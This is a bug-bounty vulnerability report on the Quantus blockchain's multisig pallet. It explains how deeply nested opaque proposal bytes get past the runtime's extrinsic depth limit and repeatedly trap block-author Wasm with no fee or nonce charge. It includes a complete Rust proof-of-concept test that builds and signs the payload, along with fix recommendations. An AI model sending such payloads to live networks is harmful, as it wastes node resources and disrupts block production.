# 90400 bc high opaque multisig proposals bypass the 256 level extrinsic depth limit and repeatedly trap block author wasm without a durable fee or nonce charge

**Submitted on Aug 24th 2026 at 20:41:40 UTC by @tinnohofficial for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #90400
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Causing network processing nodes to process transactions from the mempool beyond set parameters

## Description

## Brief/Intro

Quantus limits extrinsic nesting to `MAX_EXTRINSIC_DEPTH = 256`. Before checking a signature or dispatching a transaction, `Executive` re-encodes the extrinsic and decodes it with that depth limit. This is intended to prevent a small recursively nested call from exhausting a runtime execution stack.

`Multisig::propose`, however, accepts the intended inner `RuntimeCall` as an opaque `BoundedVec<u8>` of up to 10,240 bytes. The outer depth-limited decoder sees only a byte vector. After the transaction has passed pool validation and a block author selects it, `propose` decodes those bytes with unrestricted `Decode::decode`.

A signed proposal containing 2,500 nested `Utility::as_derivative` calls is only 10,003 bytes. The raw call is rejected by the runtime's 256-level decoder, but the opaque multisig proposal passes that same decoder and `Executive::validate_transaction`. When the production Wasm runtime dispatches it through `BlockBuilder_apply_extrinsic`, unrestricted decoding recurses until Wasmtime traps with an out-of-bounds memory access in `RuntimeCall::decode`.

The trap occurs before the pallet withdraws `ProposalFee` or reserves `ProposalDeposit`. Block construction rolls back the complete extrinsic attempt, including its transaction-payment withdrawal and nonce increment. Authorship removes and temporarily bans the exact transaction hash, but an attacker can change the proposal expiry or nested derivative indices, sign a new hash with the unchanged current nonce, and trigger the same path again.

## Vulnerability Details

### The executive enforces a 256-level admission boundary

Quantus declares the maximum nesting depth in `frame/support/src/lib.rs:39-40`:

```rust
/// Maximum nesting level for extrinsics.
pub const MAX_EXTRINSIC_DEPTH: u32 = 256;
```

`Executive::do_apply_extrinsic` deliberately applies that limit before signature checking or dispatch (`frame/executive/src/lib.rs:863-886`):

```rust
let encoded = uxt.encode();

let uxt = <Block::Extrinsic as codec::DecodeLimit>::decode_all_with_depth_limit(
    MAX_EXTRINSIC_DEPTH,
    &mut &encoded[..],
)
.map_err(|_| InvalidTransaction::Call)?;

let xt = check(uxt, &Context::default())?;
let dispatch_info = xt.get_dispatch_info();
```

The PoC proves that the raw 2,500-level `RuntimeCall` is rejected by this decoder.

### Multisig turns the nested call into opaque bytes at admission

The custom Quantus multisig pallet defines its proposal call as bytes bounded only by encoded length (`pallets/multisig/src/lib.rs:184-186,250-251`):

```rust
/// Maximum size of an encoded call
#[pallet::constant]
type MaxCallSize: Get<u32>;

pub type BoundedCallOf<T> = BoundedVec<u8, <T as Config>::MaxCallSize>;
```

The production bound is 10,240 bytes (`runtime/src/configs/mod.rs:643-657`):

```rust
pub const MaxCallSize: u32 = 10240;
```

During outer extrinsic decoding, SCALE therefore decodes the malicious recursive structure as the elements of a byte vector. It does not recurse into the encoded `RuntimeCall`. The outer proposal passes `decode_all_with_depth_limit(256)`, and its declared dispatch weight can be obtained without inspecting the bytes because the annotation uses `call.len()` plus `MaxInnerCallWeight`.

This also makes transaction-pool validation succeed. The PoC signs the proposal with the production ML-DSA-65 signature type and every production transaction extension, then calls:

```rust
Executive::validate_transaction(
    TransactionSource::External,
    extrinsic,
    System::block_hash(0),
)
```

The result is `Ok`, so an external peer can place the transaction in the ready pool.

### Dispatch re-decodes the bytes without any depth limit

After the proposal has passed all inexpensive multisig checks, `propose` uses unrestricted decoding (`pallets/multisig/src/lib.rs:594-604`):

```rust
let decoded_call = <T as Config>::RuntimeCall::decode(&mut &call[..])
    .map_err(|_| Self::err_burn_full_raw(Error::<T>::InvalidCall))?;

let call_weight = decoded_call.get_dispatch_info().call_weight;
```

`execute` repeats the same unsafe operation for stored calls (`pallets/multisig/src/lib.rs:1123-1131`):

```rust
let call = <T as Config>::RuntimeCall::decode(&mut &proposal.call[..])
    .map_err(|_| Self::err_burn_full_raw(Error::<T>::InvalidCall))?;
let current_call_weight = call.get_dispatch_info().call_weight;
```

Neither operation uses `DecodeLimit`, and neither requires that all bytes be consumed. With 2,500 nested `Utility::as_derivative` variants, each four-byte wrapper adds one Rust/Wasm decode frame while the complete encoded payload remains only 10,003 bytes.

The PoC invokes the frozen runtime's actual Wasm blob through the same `WasmExecutor<sp_io::SubstrateHostFunctions>` used by `node/src/service.rs:599-605`. After a `Core_version` warm-up excludes Wasm compilation time, `BlockBuilder_apply_extrinsic` deterministically returns:

```
Execution aborted due to trap: wasm trap: out of bounds memory access
WASM backtrace:
    ... quantus_runtime::RuntimeCall::decode ...
    ... pallet_utility::Call<T>::decode ...
    ... quantus_runtime::RuntimeCall::decode ...
```

The focused run on the test host reached the production trap after approximately 59 ms. A native invocation on a one-MiB thread stack aborts the process with `fatal runtime error: stack overflow`; production nodes use Wasm, so this report does not claim that the node process itself crashes.

### The intended weight charge and proposal fee never become effective

The pallet comments acknowledge that nested call decoding has structure-dependent cost and reserve `MaxInnerCallWeight`. That reservation does not make unrestricted recursion safe. It only affects normal dispatch accounting after execution returns.

More importantly, the non-refundable proposal fee and deposit are below the vulnerable decode (`pallets/multisig/src/lib.rs:625-649`):

```rust
let _ = T::Currency::withdraw(&proposer, fee, ...)?;

let deposit = T::ProposalDeposit::get();
T::Currency::reserve(&proposer, deposit)?;
```

The trap happens at line 599, before either statement. The transaction-payment extension may withdraw the outer transaction fee before dispatch, but block construction executes every candidate in a storage transaction. `sc-block-builder-0.48.0/src/lib.rs:292-310` rolls the whole attempt back when the runtime API returns the executor trap:

```rust
self.api.execute_in_transaction(|api| {
    let res = api.apply_extrinsic(parent_hash, xt.clone());
    match res {
        Ok(Ok(_)) => TransactionOutcome::Commit(Ok(())),
        Ok(Err(tx_validity)) => TransactionOutcome::Rollback(...),
        Err(e) => TransactionOutcome::Rollback(Err(Error::from(e))),
    }
})
```

Thus the signer keeps its current account nonce and pays neither the transaction fee nor the multisig proposal fee for the trap.

### Hash banning does not close the repeat path

Basic authorship catches the `BlockBuilder::push` error, marks the transaction invalid, and continues constructing the block. This prevents one proposal from halting the whole network, and this report does not claim total shutdown.

The mitigation is local and hash-specific. `sc-basic-authorship-0.53.0/src/basic_authorship.rs:576-601` passes the hash to `transaction_pool.report_invalid`; Quantus's transaction pool removes that hash and temporarily bans it for 30 minutes. It does not invalidate the signer's unchanged nonce on chain.

The attacker can produce a fresh valid hash by changing any of the following without changing the vulnerable behavior:

* `expiry`, which may be any future block up to `MaxExpiryDuration = 100,800`;
* one or more of the 2,500 `as_derivative.index` values;
* ignored trailing bytes inside the 10,240-byte bounded call, because `Decode::decode` does not require complete consumption.

After a one-time creation of a multisig controlled by the attacker, a newly signed proposal with the current nonce can therefore re-enter the ready pool whenever the prior hash is removed. The attacker must maintain enough free balance to pass transaction-payment validation, but rollback means this balance is not consumed by malicious proposals.

## Impact Details

This maps to **High - Causing network processing nodes to process transactions from the mempool beyond set parameters**:

* The runtime explicitly limits extrinsic call nesting to 256.
* The malicious raw call is correctly rejected at that limit.
* Wrapping the exact bytes in `Multisig::propose` makes a 2,500-level call pass the outer decoder and ready-pool validation.
* A block author then processes recursion almost ten times beyond the configured boundary and reaches a production-Wasm memory trap.
* The attempt consumes block-author execution time but is rolled back before nonce or fee changes become durable.
* Banning the exact hash does not prevent fresh variants from the same signer and multisig.

Authorship handles the trap as an invalid candidate and can still produce a block, so this is not being submitted as a Critical network shutdown or as the High 500%-block-delay impact. The selected impact is the separate, exact mempool-processing-beyond-parameters category.

## Why This Is a New Bypass Rather Than the Publicly Fixed Decode-Weight Issue

PR #608 publicly identified that `propose` decodes attacker-controlled `RuntimeCall` bytes, that nested calls make this work scale with `inner_call_count` rather than byte length, and that undercharging it could cause availability DoS. Its stated fix was to reserve `MaxInnerCallWeight` and return `actual_weight: None` after post-decode rejection so the full weight is burned. The collaborator review approved that accounting on the assumption that every decode attempt returns through normal post-dispatch handling.

This report does not resubmit that disclosed undercharge. It demonstrates a bypass of its mitigation: unrestricted recursive decoding does not return `Ok` or `Err` in production Wasm. It exhausts the Wasm stack and traps out of the runtime API. Consequently, `actual_weight: None` is never returned, and the block builder rolls back the transaction-payment withdrawal, nonce increment, and all pallet state. Neither PR #608 nor its review mentions a decode-depth limit, stack exhaustion, executor trap, transactional rollback, or same-nonce fresh-hash variants.

PR #640 separately lists `MAX_EXTRINSIC_DEPTH enforced before unchecked-to-checked conversion` and `Depth-limited decode is applied before signature check` as invalid findings. Those entries confirm that the outer `Executive` decoder is correctly bounded; they do not inspect opaque bytes that `Multisig::propose` decodes later during dispatch. The PoC proves both sides of this distinction using the same payload: raw bytes fail the Executive decoder, while the opaque proposal passes it and traps only at deferred decoding.

The published Equilibrium multisig review also contains three superficially related findings, but none covers this admission bypass or runtime trap:

* `EQ-QNT-MULTISIG-F-01` reported that successful inner-call execution was not included in the multisig weight model. The current code fixes that by reserving `MaxInnerCallWeight`. This issue occurs earlier, while decoding the opaque bytes, before any inner call dispatches. The reserved weight cannot prevent stack exhaustion, and the executor trap rolls back the fee that would normally price the reservation.
* `EQ-QNT-MULTISIG-O-01` discusses the ordering of high-security validation and decoding relative to cheap proposal checks. It does not identify unrestricted recursion, a bypass of `MAX_EXTRINSIC_DEPTH`, pool admission, or a Wasm trap.
* `EQ-QNT-MULTISIG-O-03` reported that `propose` accepted an unbounded raw `Vec<u8>`. Commit `1d299f1704b519924df8fcd944e09c963bd3698c` fixed that issue with the current 10,240-byte `BoundedVec`. The PoC deliberately stays within that fixed bound at 10,003 bytes; the defect is that byte length does not bound recursive decode depth.

Commit `e127ffd810718e64c8a2c21393c270aa78ca3318` is PR #608's merged mitigation. It retained unrestricted `Decode::decode`, so its reservation and burn account for work only when decoding returns normally. The new defect is the demonstrated non-returning executor-trap path through that mitigation, not the already disclosed fact that ordinary nested decoding has structure-dependent cost.

This is also Quantus-specific code rather than an unchanged upstream pallet report. Quantus's multisig has a custom opaque proposal format, custom fees and deposits, custom high-security policy, and custom decode/execute flow.

## Recommended Fix

{% stepper %}
{% step %}

## Bound decoding depth and require complete consumption

Require `RuntimeCall` to implement `DecodeLimit` and replace both unrestricted decodes with `decode_all_with_depth_limit(MAX_EXTRINSIC_DEPTH, ...)`.

Use `decode_all` semantics so trailing bytes are rejected rather than silently ignored.
{% endstep %}

{% step %}

## Apply the bounded decoder to both paths

Apply the same bounded decoder in both `propose` and `execute`; `execute` must safely reject any legacy stored payload that exceeds the new limit.
{% endstep %}

{% step %}

## Add regression coverage

Add a regression test using opaque nested utility calls close to `MaxCallSize` and prove it returns `InvalidCall` without trapping.
{% endstep %}

{% step %}

## Add validation as defense in depth

Consider rejecting over-depth opaque calls during transaction validation as defense in depth, so they do not enter or propagate through the ready pool. The dispatch-time bounded decode remains necessary even if validation is added.
{% endstep %}
{% endstepper %}

## References

* `frame/support/src/lib.rs:39-40` - explicit `MAX_EXTRINSIC_DEPTH = 256` boundary.
* `frame/executive/src/lib.rs:863-900` - depth-limited outer extrinsic decode and dispatch.
* `pallets/multisig/src/lib.rs:162-230` - custom `RuntimeCall`, call-size, fee, and inner-weight configuration.
* `pallets/multisig/src/lib.rs:250-289` - opaque bounded call and proposal storage types.
* `pallets/multisig/src/lib.rs:517-649` - declared weight, unrestricted proposal decode, and later fee/deposit charge.
* `pallets/multisig/src/lib.rs:1060-1156` - unrestricted execute-time decode.
* `runtime/src/configs/mod.rs:643-657` - 10,240-byte call bound, 1 UNIT proposal fee/deposit, and inner-call weight.
* `runtime/src/configs/mod.rs:701-715` - production multisig configuration.
* `node/src/service.rs:599-605` - production Wasm executor.
* `client/transaction-pool/src/single_state_txpool/single_state_txpool.rs:384-393` - invalid transaction removal.
* `client/transaction-pool/src/graph/validated_pool.rs:784-813,862-899` - exact-hash ban and removal.
* `sc-block-builder-0.48.0/src/lib.rs:284-312` - transactional candidate execution and rollback.
* `sc-basic-authorship-0.53.0/src/basic_authorship.rs:547-603` - trap handling, invalid report, and continued authorship.
* `1d299f1704b519924df8fcd944e09c963bd3698c` - fix for the published unbounded-`Vec` observation.
* `e127ffd810718e64c8a2c21393c270aa78ca3318` - current nested-call weight mitigation retaining unrestricted decode.
* `https://github.com/Quantus-Network/chain/pull/608` - public nested-decode weight fix that this trap bypasses.
* `https://github.com/Quantus-Network/chain/pull/640` - public outer Executive-depth findings, which do not cover deferred opaque decoding.

## Proof of Concept

## Run

{% stepper %}
{% step %}

## Add the development dependency

Add this dev dependency to `runtime/Cargo.toml`:

```toml
[dev-dependencies]
sc-executor.workspace = true
```

{% endstep %}

{% step %}

## Save and run the test

Save the test below as `runtime/tests/multisig_recursive_decode.rs`, then run from the chain repository:

```bash
cargo test -p quantus-runtime --test multisig_recursive_decode -- --nocapture
```

{% endstep %}
{% endstepper %}

Observed output on frozen commit `3b243b870a5442a6e5f443056f67bbba87d472f5`:

```
running 4 tests
test one_mib_stack_helper ... ok
test opaque_multisig_call_bypasses_extrinsic_decode_depth_limit ... ok
test opaque_multisig_call_passes_transaction_pool_validation ... ok
recursive multisig Wasm trap after 59.20425ms
test production_wasm_stack_traps_while_dispatching_the_admitted_proposal ... ok

test result: ok. 4 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out
```

The optional native-stack reproduction intentionally aborts its test process:

```bash
QUANTUS_REPRODUCE_MULTISIG_STACK_TRAP=1 \
cargo test -p quantus-runtime --test multisig_recursive_decode one_mib_stack_helper -- --exact --nocapture
```

It prints:

```
thread '<unknown>' has overflowed its stack
fatal runtime error: stack overflow
```

SHA-256 of the complete test below:

```
66e43028f1cef4557b35bf2cb5a3b4a8e738e77de8be9cca1442730b6b526c99  runtime/tests/multisig_recursive_decode.rs
```

## PoC Code

```rust
use codec::{Decode, DecodeLimit, Encode};
use frame_support::{dispatch::GetDispatchInfo, traits::Currency, MAX_EXTRINSIC_DEPTH};
use qp_dilithium_crypto::Dilithium65Pair;
use quantus_runtime::{
	transaction_extensions::{ReversibleTransactionExtension, WormholeProofRecorderExtension},
	Balances, BuildStorage, Executive, Multisig, Runtime, RuntimeCall, RuntimeOrigin, Signature,
	SignedPayload, System, TxExtension, UncheckedExtrinsic, UNIT, VERSION, WASM_BINARY,
};
use sp_core::traits::{CallContext, CodeExecutor, RuntimeCode, WrappedRuntimeCode};
use sp_core::Pair;
use sp_runtime::{
	generic::Era, traits::IdentifyAccount, transaction_validity::TransactionSource, AccountId32,
	MultiAddress,
};

const REPRODUCE_STACK_TRAP: &str = "QUANTUS_REPRODUCE_MULTISIG_STACK_TRAP";

fn nested_derivative_payload(depth: usize) -> Vec<u8> {
	let leaf = RuntimeCall::System(frame_system::Call::remark { remark: Vec::new() });
	let leaf_bytes = leaf.encode();
	let wrapper = RuntimeCall::Utility(pallet_utility::Call::as_derivative {
		index: 0,
		call: Box::new(leaf),
	});
	let wrapper_bytes = wrapper.encode();
	let prefix_len = wrapper_bytes.len() - leaf_bytes.len();
	let prefix = &wrapper_bytes[..prefix_len];

	let mut payload = Vec::with_capacity(prefix.len() * depth + leaf_bytes.len());
	for _ in 0..depth {
		payload.extend_from_slice(prefix);
	}
	payload.extend_from_slice(&leaf_bytes);
	payload
}

fn signed_call(pair: &Dilithium65Pair, call: RuntimeCall) -> UncheckedExtrinsic {
	let genesis_hash = System::block_hash(0);
	let tx_ext: TxExtension = (
		frame_system::CheckNonZeroSender::<Runtime>::new(),
		frame_system::CheckSpecVersion::<Runtime>::new(),
		frame_system::CheckTxVersion::<Runtime>::new(),
		frame_system::CheckGenesis::<Runtime>::new(),
		frame_system::CheckEra::<Runtime>::from(Era::immortal()),
		frame_system::CheckNonce::<Runtime>::from(0),
		frame_system::CheckWeight::<Runtime>::new(),
		ReversibleTransactionExtension::<Runtime>::new(),
		WormholeProofRecorderExtension::<Runtime>::new(),
		pallet_transaction_payment::ChargeTransactionPayment::<Runtime>::from(0),
		frame_metadata_hash_extension::CheckMetadataHash::<Runtime>::new(false),
		frame_system::WeightReclaim::<Runtime>::new(),
	);
	let payload = SignedPayload::from_raw(
		call.clone(),
		tx_ext.clone(),
		(
			(),
			VERSION.spec_version,
			VERSION.transaction_version,
			genesis_hash,
			genesis_hash,
			(),
			(),
			(),
			(),
			(),
			None,
			(),
		),
	);
	let signature = payload.using_encoded(|bytes| pair.sign(bytes));
	UncheckedExtrinsic::new_signed(
		call,
		MultiAddress::Id(pair.public().into_account()),
		Signature::Dilithium65(signature),
		tx_ext,
	)
}

#[test]
fn opaque_multisig_call_bypasses_extrinsic_decode_depth_limit() {
	let payload = nested_derivative_payload(2_500);
	assert_eq!(payload.len(), 10_003, "payload shape changed");
	assert!(payload.len() < 10_240, "payload must fit runtime MaxCallSize");
	let bounded: pallet_multisig::BoundedCallOf<Runtime> =
		payload.clone().try_into().expect("payload fits multisig call bound");
	let outer = RuntimeCall::Multisig(pallet_multisig::Call::propose {
		multisig_address: AccountId32::new([3; 32]),
		call: bounded,
		expiry: 100,
	});
	let outer_bytes = outer.encode();
	assert!(
		RuntimeCall::decode_all_with_depth_limit(MAX_EXTRINSIC_DEPTH, &mut &outer_bytes[..])
			.is_ok(),
		"the outer proposal treats its nested call as opaque bytes and passes admission decoding"
	);
	let _ = outer.get_dispatch_info();

	assert!(
		RuntimeCall::decode_all_with_depth_limit(MAX_EXTRINSIC_DEPTH, &mut &payload[..]).is_err(),
		"the executive's decoder must reject this recursion depth"
	);

	// Multisig::propose and execute use Decode::decode directly. Give the test a large
	// stack so it can demonstrate acceptance instead of reproducing the runtime stack trap.
	std::thread::Builder::new()
		.stack_size(64 * 1024 * 1024)
		.spawn(move || {
			let mut input = &payload[..];
			let decoded = RuntimeCall::decode(&mut input)
				.expect("unbounded decoder accepts the deeply nested opaque call");
			assert!(input.is_empty());
			let _ = decoded.get_dispatch_info();
		})
		.expect("test thread starts")
		.join()
		.expect("deep decode completes with an enlarged stack");
}

#[test]
fn opaque_multisig_call_passes_transaction_pool_validation() {
	let pair_a = Dilithium65Pair::from_seed_slice(&[1; 32]).unwrap();
	let pair_b = Dilithium65Pair::from_seed_slice(&[2; 32]).unwrap();
	let signer_a = pair_a.public().into_account();
	let signer_b = pair_b.public().into_account();
	let storage = frame_system::GenesisConfig::<Runtime>::default().build_storage().unwrap();
	let mut ext = sp_io::TestExternalities::new(storage);

	ext.execute_with(|| {
		System::set_block_number(1);
		Balances::make_free_balance_be(&signer_a, 1_000 * UNIT);
		let signers = vec![signer_a.clone(), signer_b];
		Multisig::create_multisig(RuntimeOrigin::signed(signer_a), signers.clone(), 2, 0).unwrap();
		let multisig = Multisig::derive_multisig_address(&signers, 2, 0);
		let call: pallet_multisig::BoundedCallOf<Runtime> =
			nested_derivative_payload(2_500).try_into().unwrap();
		let proposal_a = RuntimeCall::Multisig(pallet_multisig::Call::propose {
			multisig_address: multisig.clone(),
			call: call.clone(),
			expiry: 100,
		});
		let proposal_b = RuntimeCall::Multisig(pallet_multisig::Call::propose {
			multisig_address: multisig,
			call,
			expiry: 101,
		});
		let extrinsic_a = signed_call(&pair_a, proposal_a);
		let extrinsic_b = signed_call(&pair_a, proposal_b);
		assert_ne!(
			extrinsic_a.encode(),
			extrinsic_b.encode(),
			"changing only expiry must produce a fresh transaction hash"
		);

		for extrinsic in [extrinsic_a, extrinsic_b] {
			assert!(
				Executive::validate_transaction(
					TransactionSource::External,
					extrinsic,
					System::block_hash(0),
				)
				.is_ok(),
				"same-nonce opaque variants must pass pool validation before dispatch decodes them"
			);
		}
	});
}

#[test]
fn production_wasm_stack_traps_while_dispatching_the_admitted_proposal() {
	let pair_a = Dilithium65Pair::from_seed_slice(&[1; 32]).unwrap();
	let pair_b = Dilithium65Pair::from_seed_slice(&[2; 32]).unwrap();
	let signer_a = pair_a.public().into_account();
	let signer_b = pair_b.public().into_account();
	let storage = frame_system::GenesisConfig::<Runtime>::default().build_storage().unwrap();
	let mut ext = sp_io::TestExternalities::new(storage);
	let extrinsic = ext.execute_with(|| {
		System::set_block_number(1);
		Balances::make_free_balance_be(&signer_a, 1_000 * UNIT);
		let signers = vec![signer_a.clone(), signer_b];
		Multisig::create_multisig(RuntimeOrigin::signed(signer_a), signers.clone(), 2, 0).unwrap();
		let multisig = Multisig::derive_multisig_address(&signers, 2, 0);
		let call = nested_derivative_payload(2_500).try_into().unwrap();
		let proposal = RuntimeCall::Multisig(pallet_multisig::Call::propose {
			multisig_address: multisig,
			call,
			expiry: 100,
		});
		signed_call(&pair_a, proposal)
	});

	let code = WrappedRuntimeCode(WASM_BINARY.expect("runtime wasm is built").into());
	let runtime_code = RuntimeCode { code_fetcher: &code, heap_pages: None, hash: Vec::new() };
	let executor = sc_executor::WasmExecutor::<sp_io::SubstrateHostFunctions>::builder().build();
	let input = (extrinsic,).encode();
	let mut wasm_ext = ext.ext();
	let (warmup, _) =
		executor.call(&mut wasm_ext, &runtime_code, "Core_version", &[], CallContext::Onchain);
	warmup.expect("runtime Wasm compiles before measuring the malicious call");
	let started = std::time::Instant::now();
	let (result, _) = executor.call(
		&mut wasm_ext,
		&runtime_code,
		"BlockBuilder_apply_extrinsic",
		&input,
		CallContext::Onchain,
	);
	let elapsed = started.elapsed();
	let error = result.expect_err("production Wasm must trap on the recursive opaque call");
	let error = error.to_string();
	assert!(
		error.contains("wasm trap")
			&& (error.contains("out of bounds memory access")
				|| error.contains("call stack exhausted"))
			&& error.contains("RuntimeCall>::decode"),
		"unexpected Wasm execution error: {error}"
	);
	eprintln!("recursive multisig Wasm trap after {elapsed:?}");
}

#[test]
fn one_mib_stack_helper() {
	if std::env::var_os(REPRODUCE_STACK_TRAP).is_none() {
		return;
	}

	let payload = nested_derivative_payload(2_500);
	std::thread::Builder::new()
		.stack_size(1024 * 1024)
		.spawn(move || {
			let storage =
				frame_system::GenesisConfig::<Runtime>::default().build_storage().unwrap();
			let mut ext = sp_io::TestExternalities::new(storage);
			ext.execute_with(|| {
				System::set_block_number(1);
				let signer_a = AccountId32::new([1; 32]);
				let signer_b = AccountId32::new([2; 32]);
				Balances::make_free_balance_be(&signer_a, 1_000 * UNIT);
				let signers = vec![signer_a.clone(), signer_b];
				Multisig::create_multisig(
					RuntimeOrigin::signed(signer_a.clone()),
					signers.clone(),
					2,
					0,
				)
				.unwrap();
				let multisig = Multisig::derive_multisig_address(&signers, 2, 0);
				let call = payload.try_into().unwrap();

				// Public dispatch path: propose decodes the opaque call before rejecting
				// its recursively accumulated dispatch weight.
				let _ = Multisig::propose(RuntimeOrigin::signed(signer_a), multisig, call, 100);
			});
		})
		.unwrap()
		.join()
		.unwrap();
}
```
